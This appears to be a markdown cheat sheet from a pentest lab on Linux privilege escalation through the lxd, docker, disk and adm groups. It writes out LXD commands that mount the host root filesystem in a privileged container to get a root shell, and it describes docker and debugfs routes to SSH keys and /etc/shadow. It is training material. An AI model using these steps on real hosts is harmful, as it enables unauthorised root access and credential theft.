# LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager.¿

Unzip the Alpine image.

 ```
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```
Start the LXD initialization process. ¿
```
devops@NIX02:~$ lxd init
```
Import the local image.

```
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
```
Creating r00t
Mount the host file system.

```
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Device mydev added to r00t
Find in /mnt/root/root
```
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```
# Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.

# Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

# ADM
Members of the adm group are able to read all logs stored in /var/log. 
